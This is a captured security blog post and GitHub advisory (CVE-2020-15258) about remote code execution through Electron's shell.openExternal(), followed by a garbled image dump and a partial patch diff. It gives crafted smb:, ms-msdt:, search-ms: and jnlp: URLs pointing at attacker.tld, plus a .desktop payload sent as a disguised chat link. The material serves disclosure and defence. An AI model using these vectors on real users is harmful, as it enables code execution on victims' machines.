=== Content from benjamin-altpeter.de_80251f2f_20250119_124749.html ===
[Benjamin Altpeter](https://benjamin-altpeter.de/)[Home](https://benjamin-altpeter.de/)
[Blog](https://benjamin-altpeter.de/post)
[Docs](https://docs.benjamin-altpeter.de)
[Projects](https://benjamin-altpeter.de/projects)
[Contact](https://benjamin-altpeter.de/contact)![The dangers of Electron's shell.openExternal()—many paths to remote code execution](https://benjamin-altpeter.de/img/shell-openexternal-dangers.png)
# The dangers of Electron's shell.openExternal()—many paths to remote code execution

Published: 2020-08-29T17:27

For my bachelor’s thesis, I looked into the security of [Electron](https://www.electronjs.org/) apps. One possible attack vector that kept coming up was the insecure use of the `shell.openExternal()` function, which is commonly used to open websites in the user’s browser instead of in-app. Both the official [security recommendations](https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content) by the Electron developers and Doyensec’s [Electron security checklist](https://doyensec.com/resources/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security-wp.pdf) explicitly warn not to pass untrusted input to this function, explaining that an attacker might otherwise be able to execute arbitrary commands on the user’s computer.
But how would the attacker actually do that? Apart from [an answer on the Information Security Stack Exchange](https://security.stackexchange.com/a/225808) with some partly outdated details, there didn’t seem to be any information available.

So, I had to dig in myself. I found that `shell.openExternal()` can **absolutely** be used to execute arbitrary code on all major systems (Windows, macOS and Linux). But the actual attack vectors that are available vary depending on the system. This post will provide an overview of what I found. The attacks presented here are by no means exhaustive—there are definitely others. Just because your app protects against the attacks I list, doesn’t mean you are safe. I will include a [section](#defending-against-these-attacks) at the end of the post on how to safely use `shell.openExternal()`.

## What is this all about?

But before we go into the actual attacks, let’s take a step back and discuss what the problem is in the first place. Electron includes a function `shell.openExternal(url)` that will “open the given external protocol URL in the desktop’s default manner” according to the [documentation](https://www.electronjs.org/docs/api/shell#shellopenexternalurl-options). This means that if I call `shell.openExternal('https://benjamin-altpeter.de)`, my website would open in the user’s default browser instead of in my Electron app. Similarly, if I were to call `shell.openExternal('mailto:hi@bn.al')`, the user’s default email program would open, ready to compose an email to me.

So far, so good. From my experience, this is the only functionality that most apps need. The problem is that `shell.openExternal()` can do **a lot** more. In fact, it will happily open URLs for any protocol (see [this section](#digging-deeper-into-how-shellopenexternal-actually-opens-urls) on why that is).

The first potentially ‘problematic’ protocol that comes to mind is the `file:` protocol and that is actually the one that is usually discussed. What if we were to pass `file://c:/windows/system32/calc.exe` or `file:/System/Applications/Calculator.app`? As you might guess, this would indeed open the calculator on Windows or macOS, respectively. However, this isn’t too interesting in and of itself. As we can only specify the path to the executable but not pass any arguments, the chance of executing a [living off the land attack](https://lolbas-project.github.io) are slim. Thus, the attacker would likely have needed to drop a malicious executable beforehand. Don’t get me wrong: This is already a problem but the actual impact is far greater as we will see.

## Enter: remote files

We don’t have to limit ourselves to local files already on the user’s computer, though. Operating systems typically also include support for accessing files on remote file servers. Maybe we can use those to more easily execute arbitrary code? Why yes, yes we can! As I hinted at earlier, the particular attacks depend on the operating system in use, so I will go through the major ones.

### Windows

Windows most notably supports the [SMB/CIFS protocol](https://en.wikipedia.org/wiki/Server_Message_Block). We can access files on a remote SMB server using URLs of the form `\\server\share\path\to\file` (which just maps back to a `file:` URL). For testing, we can conveniently use Microsoft’s [Sysinternals Live](https://docs.microsoft.com/en-us/sysinternals/#sysinternals-live) service which hosts all kinds of (harmless) programs on a publicly available SMB server.

So, let’s try calling the following:

```
shell.openExternal('\\\\live.sysinternals.com\\tools\\procmon.exe');

```

And indeed, this will open the Process Monitor program, even though it was never present on the user’s disk. Do note however, that a “Security Warning” mentioning the full path is displayed before the program is actually executed. Abusing *security fatigue*, i.e. users being tired of constant security prompts and simply accepting them without further consideration, the attacker could use a specifically crafted host and file name to convince the user to click “Run” there.

### macOS

While macOS also supports SMB (as well as [AFP](https://en.wikipedia.org/wiki/Apple_Filing_Protocol) and [NFS](https://en.wikipedia.org/wiki/Network_File_System)), trying to open a URL like `smb://attacker.tld/public/exploit.app` with `shell.openExternal()` will merely open Finder with the program selected in recent versions (tested with Catalina). If however, the attacker could somehow convince the user to mount the share themselves, the file would now also be available through `file:/Volumes/public/exploit.app` where it can actually be executed.

Further, macOS previously had an automount feature that would make any NFS export available via `file:/net/attacker.tld/path/to/export`. While this feature has been disabled in Catalina, it continues to work on machines that have not been upgraded yet.

### Linux

On **Linux**, the situation is more complex. The `xdg-open` program, which is used internally by `shell.openExternal()` (see [this section](#digging-deeper-into-how-shellopenexternal-actually-opens-urls)), will usually delegate to the desktop environment’s own “open” function, like `gio open` for Gnome. These functions usually don’t handle opening executables and will instead either refuse to open them or display them in some other application like a hex editor, if installed.

It is however possible to circumvent this limitation in some cases. On Xubuntu 20.04 running the XFCE desktop, `.desktop` files can be executed using `xdg-open`. Those files can execute arbitrary commands as this simple example shows:

```
[Desktop Entry]
Exec=xmessage "Hello from Electron."
Type=Application

```

The handling of remote locations also differs between distributions and desktop environments. While Ubuntu 20.04 with Gnome refuses to open Samba shares that have not been mounted yet, Xubuntu 20.04 will instead gladly open files from there, including `.desktop` files (albeit sometimes with a warning about an “Untrusted application launcher”).

## Take your pick of a protocol

In addition, even if `file:` and similar URLs are filtered out, the attacker can make use of the myriad of other URI scheme handlers registered on modern systems. Vulnerabilities in those protocol handlers occur from time to time (in programs like [Electron](https://medium.com/0xcc/electrons-bug-shellexecute-to-blame-cacb433d0d62), [Microsoft Edge](https://leucosite.com/Microsoft-Edge-RCE/), [Ubisoft’s Uplay](https://thewhiteh4t.github.io/2018/11/16/ubisoft-uplay-rce-exploit.html), or [Origin](https://zero.lol/2019-05-22-fun-with-uri-handlers/)) and sometimes even the intended behaviour of those handlers can also be abused.

I will give three examples for Windows here but there are definitely more of them out there and similar vectors likely also exist for other systems.

* Windows includes the `ms-msdt:` protocol that opens the [Microsoft Support Diagnostic Tool](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msdt) which provides the troubleshooting wizard to diagnose Wi-Fi and audio problems and the like. This protocol directly passes the string it is given to the `msdt.exe` program. The attacker now needs to find an included wizard that allows the execution of arbitrary programs, preferably even remote ones. The program compatibility wizard fits this description. Luckily for the attacker, all user input can also be prefilled from the command line, leading to this URL:

  ```
  ms-msdt:-id PCWDiagnostic /moreoptions false /skip true /param IT_BrowseForFile="\\live.sysinternals.com\tools\procmon.exe" /param IT_SelectProgram="NotListed" /param IT_AutoTroubleshoot="ts_AUTO"

  ```

  Upon opening this URL with `shell.openExternal()`, the troubleshooting wizard will open and show a progress bar for the “diagnosis”. Once completed, the user is asked to click a button to check the compatibility settings. When they do so, the Process Monitor tool is once again launched from the remote server. As this vector uses the official Microsoft troubleshooting tool that the user may already be familiar with and signals legitimate diagnosis taking place, it shouldn’t be too hard for the attacker to convince the user that clicking this button is necessary.
* Windows further includes the [`search-ms:` protocol](https://docs.microsoft.com/en-us/windows/win32/search/getting-started-with-parameter-value-arguments) that opens the search feature. The attacker can supply both the query of the search and the location. This location can also be on a remote Samba share. Finally, they can even set the title of the search window.

  Using this, the attacker can craft the following URL searching the Sysinternals Live share to only display the Process Monitor executable with a title suggesting an important update:

  ```
  search-ms:query=procmon.exe&crumb=location:%5C%5Clive.sysinternals.com%5Ctools&displayname=Important%20update

  ```
* If Java, which is often bundled with LibreOffice for example, is installed on the system, the attacker could also use the `jnlp:` protocol to launch a remote Java application like this (this does display a warning, though):

  ```
  jnlp:https://attacker.tld/program.jnlp

  ```

## Digging deeper into how shell.openExternal() actually opens URLs

If you want to research this topic further, it is useful to know how URLs are actually opened by `shell.openExternal()`. Unsurprisingly, this also differs by the operating system:

* On Windows, [a separate thread is opened](https://github.com/electron/electron/blob/dcbed18f44a11f239f4d9bddefdb6291dc20d5bb/shell/common/platform_util_win.cc#L339-L348) (omitted here for brevity), the URL is surrounded with double quotes and then directly and without any filtering passed into [`ShellExecuteW()`](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutew) (Code taken from [here](https://github.com/electron/electron/blob/dcbed18f44a11f239f4d9bddefdb6291dc20d5bb/shell/common/platform_util_win.cc#L236-254)):

  ```
  std::string OpenExternalOnWorkerThread(const GURL& url,
      const platform_util::OpenExternalOptions& options) {
    // […]
    base::string16 escaped_url = L"\""
        + base::UTF8ToUTF16(url.spec()) + L"\"";
    // […]
    ShellExecuteW(nullptr, L"open", escaped_url.c_str(), nullptr,
                  working_dir.empty() ? nullptr : working_dir.c_str(),
                  SW_SHOWNORMAL)) <= 32)
    // […]
  }

  ```
* On macOS, the call is [put onto an asynchronous dispatch queue](https://github.com/electron/electron/blob/75fd9a349698dc131f5f3c21fd1cff68f0224467/shell/common/platform_util_mac.mm#L99-L118) (omitted here for brevity), where it is passed directly into `NSWorkspace#openURLs()` (Code taken from [here](https://github.com/electron/electron/blob/75fd9a349698dc131f5f3c21fd1cff68f0224467/shell/common/platform_util_mac.mm#L31-L54)):

  ```
  std::string OpenURL(NSURL* ns_url, bool activate) {
    // […]
    NSUInteger launchOptions = NSWorkspaceLaunchDefault;
    if (!activate) launchOptions |= NSWorkspaceLaunchWithoutActivation;

    bool opened = [[NSWorkspace sharedWorkspace] openURLs:@[ ns_url ]
                                  withAppBundleIdentifier:nil
                                                  options:launchOptions
                           additionalEventParamDescriptor:nil
                                        launchIdentifiers:nil];
    // […]
  }

  ```
* On Linux, the URL is passed directly and without any filtering into `xdg-open` (Code taken from [here](https://github.com/electron/electron/blob/3e8d77d564f3f18abbd97ae9fd3a4cd417612b45/shell/common/platform_util_linux.cc#L93-L105). The `XDGOpen()` function is a wrapper that ultimately directly calls `xdg-open [url]`):

  ```
  void OpenExternal(const GURL& url, const OpenExternalOptions&
      options, OpenCallback callback) {
    // […]
    if (url.SchemeIs("mailto")) {
        /* [open in default email software] */
    }
    else {
      bool success = XDGOpen(url.spec(), false,
          platform_util::OpenCallback());
      // […]
    }
  }

  ```

All these cases are essentially the same. They take the provided URL and pass it into the respective operating system’s native method for opening arbitrary URLs, without applying any filtering or similar. It is entirely on the app developer to make sure that only the URLs they deem safe can be passed.

## Defending against these attacks

This post has hopefully shown that blocklisting certain protocols or similar approaches are not sufficient to defend against `shell.openExternal()` attacks. The only viable solution is a strict allowlist that only permits the protocols (or even particular URLs) that are actually intended to be opened.

As I have said earlier, most apps really only want to open websites in the browser or maybe compose messages in the user’s email program. For these use-cases, only `http(s):` and `mailto:` need to be allowlisted:

```
const { shell } = require('electron');

function openInBrowser(url) {
  if (!['https:', 'http:'].includes(new URL(url).protocol)) return;

  shell.openExternal(url);
}

function openInEmailSoftware(mailto_url) {
  if (new URL(mailto_url).protocol !== 'mailto:') return;

  shell.openExternal(mailto_url);
}

```
[![Icon for the Creative Commons Attribution 4.0 International license](https://benjamin-altpeter.de/icons/cc-by.svg "This content is licensed under a Creative Commons Attribution 4.0 International license.")](https://benjamin-altpeter.de/contact#license)
[Privacy policy](https://benjamin-altpeter.de/privacy) · [Legal notice](https://benjamin-altpeter.de/contact)

=== Content from github.com_b0cc846a_20250119_124751.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwireapp%2Fwire-desktop%2Fsecurity%2Fadvisories%2FGHSA-5gpx-9976-ggpm)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwireapp%2Fwire-desktop%2Fsecurity%2Fadvisories%2FGHSA-5gpx-9976-ggpm)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=wireapp%2Fwire-desktop)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[wireapp](/wireapp)
/
**[wire-desktop](/wireapp/wire-desktop)**
Public

* [Notifications](/login?return_to=%2Fwireapp%2Fwire-desktop) You must be signed in to change notification settings
* [Fork
  236](/login?return_to=%2Fwireapp%2Fwire-desktop)
* [Star
   1.1k](/login?return_to=%2Fwireapp%2Fwire-desktop)

* [Code](/wireapp/wire-desktop)
* [Issues
  93](/wireapp/wire-desktop/issues)
* [Pull requests
  33](/wireapp/wire-desktop/pulls)
* [Discussions](/wireapp/wire-desktop/discussions)
* [Actions](/wireapp/wire-desktop/actions)
* [Wiki](/wireapp/wire-desktop/wiki)
* [Security](/wireapp/wire-desktop/security)
* [Insights](/wireapp/wire-desktop/pulse)

Additional navigation options

* [Code](/wireapp/wire-desktop)
* [Issues](/wireapp/wire-desktop/issues)
* [Pull requests](/wireapp/wire-desktop/pulls)
* [Discussions](/wireapp/wire-desktop/discussions)
* [Actions](/wireapp/wire-desktop/actions)
* [Wiki](/wireapp/wire-desktop/wiki)
* [Security](/wireapp/wire-desktop/security)
* [Insights](/wireapp/wire-desktop/pulse)

# Insecure use of shell.openExternal

High

[franziskuskiefer](/franziskuskiefer)
published
GHSA-5gpx-9976-ggpm
Oct 9, 2020

## Package

No package listed

## Affected versions

<= 3.19.x

## Patched versions

3.20.x

## Description

`shell.openExternal` was used without checking the URL.

### Impact

This vulnerability allows an attacker to execute code on the victims machine.

The victim has to interact with the link though and sees the URL that is opened.

We therefore rate this vulnerability high.

### Patches

The issue was patched by implementing a helper function which checks if the URL's protocol is common. If it is common, the URL will be opened externally. If not, the URL will not be opened and a warning appears for the user informing them that a probably insecure URL was blocked from being executed.

### References

<https://benjamin-altpeter.de/shell-openexternal-dangers/>

### Credit

This issue was reported by Benjamin Altpeter.

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [the repo](https://github.com/wireapp/wire-desktop)
* Email us at [vulnerability-report@wire.com](vulnerability-report%40wire.com)

### Details and Report

I have found that the Wire Desktop Electron app opens new windows

using `shell.openExternal()`. This allows an attacker to gain remote

code execution on a user's computer if they middleclick a malicious

link.

The attack presented here works on Xubuntu 20.04. Similar attacks will

work on other operating systems.

**Steps to reproduce:**

1. Install Wire Desktop on Xubuntu 20.04.
2. Start a conversation.
3. Setup a public Samba server (at `attacker.tld` in this example) and

   create a public share (named `public` here). In this share, publish

   the following file as `pwn.desktop` and make it executable:

   ```
   [Desktop Entry]
   Exec=bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
   Type=Application
   ```
4. From another account in the same conversation, send the following

   message with the corresponding values replaced: `[Check out this great video!](smb://attacker.tld/public/pwn.desktop)`
5. Middleclick the link and (if necessary) confirm starting the

   untrusted launcher.
6. Notice the calculator and message box appearing, confirming remote

   code execution.

I have attached a video of the attack to the report.

**Affected version:** Tested using the latest version 3.18.2925 (from:

[https://github.com/wireapp/wire-desktop/releases/tag/linux%2F3.18.2925](https://github.com/wireapp/wire-desktop/releases/tag/linux/3.18.2925))

**Cause and suggested fixes:**

The problem is in the handler for the `new-window` event:

[wire-desktop/electron/src/main.ts](https://github.com/wireapp/wire-desktop/blob/cc8261101e8487a8fc13105ebae8407d32a0588d/electron/src/main.ts#L258-L268)

Lines 258 to 268
in
[cc82611](/wireapp/wire-desktop/commit/cc8261101e8487a8fc13105ebae8407d32a0588d)

|  | main.webContents.on('new-window', async (event, url) => { |
| --- | --- |
|  | event.preventDefault(); |
|  |  |
|  | // Ensure the link does not come from a webview |
|  | if (typeof (event as any).sender.viewInstanceId !== 'undefined') { |
|  | logger.log('New window was created from a webview, aborting.'); |
|  | return; |
|  | } |
|  |  |
|  | await shell.openExternal(url); |
|  | }); |

All URLs are passed to `shell.openExternal()`. Instead, I strongly

recommend switching to an allowlist that only allows a selection of

protocols (`http://`, `https://` and `mailto:` will probably be

enough). Note that blocking `smb:` isn't enough as this is just one

example of a protocol that can be used for exploitation.

**Severity:**

* The attack can be triggered remotely by an attacker by simply

  sending a message to a conversation.
* The particular attack presented here requires user interaction. The

  user has to middleclick the link (which is obfuscated) and potentially

  confirm launching the executable. The last part may not be necessary

  depending on the particular attack vector and system the user runs.
* This particular presented attack only works on certain Linux

  distributions. However, this is only due to the particular attack

  payload used (a Linux `.desktop` file accessed over Samba). Similar

  payloads will also work on other Linux distributions as well as

  Windows and macOS. The Electron documentation explicitly warns against

  using `shell.openExternal()` with untrusted content:

  <https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content>
* If the attack is executed successfully, the attacker can run

  arbitrary code on the user's system.
* Patching the problem is simple and doesn't break any legitimate use

  cases that I can think of.

### Severity

High

### CVE ID

CVE-2020-15258

### Weaknesses

No CWEs

### Credits

* [![@baltpeter](https://avatars.githubusercontent.com/u/4048809?s=40&v=4)](/baltpeter)
  [baltpeter](/baltpeter)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from avatars.githubusercontent.com_dbf281b1_20250119_141845.html ===
���� �  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222��  ( (" ���          
   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�������������������������������������������������������������������������       
  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �$����n� �Z��{T/�"��Y�bBD�fǰ��[<\I�~E��R�z�tַ��\E.�a���8���&��ֽ�c�[N�(�h���B~�� ��x���Lk�}:W��+w9��B#��1�3��A��K��Y�r�c�� ;s�Έ˘�t�U���o���� ��)<����o��µ`��^A��/���=L�;y-��H?�\~�Z��N�I��ep;�nqZ�ֳ�^J�ЙE�s�>�z��<8���W �1�N��5���3��g7���mqJ�ʭ��1ߥ`Cm%���ܣnv�C��2�+�ot�3]��8湛���V���u��y?�Z�td�ծ��������.��򭓦\i�R�=����ޣ�~����ks4���M���`?�"��}wr?L
�� ��`�P[� ������Un?��\_�G����0{��$~~E$��U<��\*��<�ҭ�����O�S���ꨤK\*x��K�N�>s ����C�z7�^��� ǔ���\�+'�q�[��

=== Content from github.com_896dafba_20250119_124750.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwireapp%2Fwire-desktop%2Fcommit%2Fb3705fffa75a03f055530f55a754face5ac0623b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwireapp%2Fwire-desktop%2Fcommit%2Fb3705fffa75a03f055530f55a754face5ac0623b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=wireapp%2Fwire-desktop)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[wireapp](/wireapp)
/
**[wire-desktop](/wireapp/wire-desktop)**
Public

* [Notifications](/login?return_to=%2Fwireapp%2Fwire-desktop) You must be signed in to change notification settings
* [Fork
  236](/login?return_to=%2Fwireapp%2Fwire-desktop)
* [Star
   1.1k](/login?return_to=%2Fwireapp%2Fwire-desktop)

* [Code](/wireapp/wire-desktop)
* [Issues
  93](/wireapp/wire-desktop/issues)
* [Pull requests
  33](/wireapp/wire-desktop/pulls)
* [Discussions](/wireapp/wire-desktop/discussions)
* [Actions](/wireapp/wire-desktop/actions)
* [Wiki](/wireapp/wire-desktop/wiki)
* [Security](/wireapp/wire-desktop/security)
* [Insights](/wireapp/wire-desktop/pulse)

Additional navigation options

* [Code](/wireapp/wire-desktop)
* [Issues](/wireapp/wire-desktop/issues)
* [Pull requests](/wireapp/wire-desktop/pulls)
* [Discussions](/wireapp/wire-desktop/discussions)
* [Actions](/wireapp/wire-desktop/actions)
* [Wiki](/wireapp/wire-desktop/wiki)
* [Security](/wireapp/wire-desktop/security)
* [Insights](/wireapp/wire-desktop/pulse)

## Commit

[Permalink](/wireapp/wire-desktop/commit/b3705fffa75a03f055530f55a754face5ac0623b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-5gpx-9976-ggpm](https://github.com/wireapp/wire-desktop/security/advisories/GHSA-5gpx-9976-ggpm "GHSA-5gpx-9976-ggpm")

[Browse files](/wireapp/wire-desktop/tree/b3705fffa75a03f055530f55a754face5ac0623b)
Browse the repository at this point in the history

* Loading branch information

[![@ffflorian](https://avatars.githubusercontent.com/u/5497598?s=40&v=4)](/ffflorian)

[ffflorian](/wireapp/wire-desktop/commits?author=ffflorian "View all commits by ffflorian")
committed
Sep 22, 2020

1 parent
[86f7820](/wireapp/wire-desktop/commit/86f782081df4eed166ab4c3bba15d43d03f2a44e)

commit b3705ff

 Show file tree

 Hide file tree

Showing
**8 changed files**
with
**141 additions**
and
**29 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* electron

  + html

    - electron/html/about.html
      [about.html](#diff-3cc9767f88ccd4d12010233e6d75a48da0836ba923fc61525c0b907887147e50)
  + src

    - lib

      * electron/src/lib/showDialog.ts
        [showDialog.ts](#diff-403623cdc094d00bf02ff6737764ba2eee129c8557c53718e9f3bc5acbed23c6)
    - electron/src/main.ts
      [main.ts](#diff-89f2871212092c5c0c2dcba947155968f89d41326697ad43bcc4b95e71e78fca)
    - menu

      * electron/src/menu/system.ts
        [system.ts](#diff-024822c002938256ba7bcf9dbb70c332f8e63216e5ffec6fb4e4d9017bf71418)
    - window

      * electron/src/window/AboutWindow.ts
        [AboutWindow.ts](#diff-ed4c6fc19b999dbf7ce00e72c0818605ebb809d5ecc5dde46bda63ee44f9734e)
      * electron/src/window/WindowUtil.test.ts
        [WindowUtil.test.ts](#diff-19736879ee4d476b29b78d47ca72f2a255255e7b0c26616c7c0cc3feb0537846)
      * electron/src/window/WindowUtil.ts
        [WindowUtil.ts](#diff-cb8e8a126bf93099f523a6e716ca03e2570634940c9b0231c35c738e9e0cdb44)
* yarn.lock
  [yarn.lock](#diff-51e4f558fae534656963876761c95b83b6ef5da5103c4adef6768219ed76c2de)

## There are no files selected for viewing

8 changes: 6 additions & 2 deletions

8
[electron/html/about.html](#diff-3cc9767f88ccd4d12010233e6d75a48da0836ba923fc61525c0b907887147e50 "electron/html/about.html")

Show comments

[View file](/wireapp/wire-desktop/blob/b3705fffa75a03f055530f55a754face5ac0623b/electron/html/about.html)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -11,10 +11,14 @@ <h1 id="name"></h1> |
|  |  | <p class="copy"><span data-string="aboutVersion"></span> <span id="version"></span></p> |
|  |  | <p class="webappVersion copy"><span data-string="aboutWebappVersion"></span> <span id="webappVersion"></span></p> |
|  |  | <p> |
|  |  | <a href="https://support.wire.com/hc/articles/115001919905"><span data-string="aboutUpdate"></span></a> |
|  |  | <a href="https://support.wire.com/hc/articles/115001919905" target="\_blank"> |
|  |  | <span data-string="aboutUpdate"></span> |
|  |  | </a> |
|  |  | </p> |
|  |  | <p> |
|  |  | <a href="https://medium.com/wire-news/webapp-updates/home"><span data-string="aboutReleases"></span></a> |
|  |  | <a href="https://medium.com/wire-news/webapp-updates/home" target="\_blank"> |
|  |  | <span data-string="aboutReleases"></span> |
|  |  | </a> |
|  |  | </p> |
|  |  | <p><span id="copyright"></span></p> |
|  |  | </div> |
| Expand Down | |  |

11 changes: 11 additions & 0 deletions

11
[electron/src/lib/showDialog.ts](#diff-403623cdc094d00bf02ff6737764ba2eee129c8557c53718e9f3bc5acbed23c6 "electron/src/lib/showDialog.ts")

Show comments

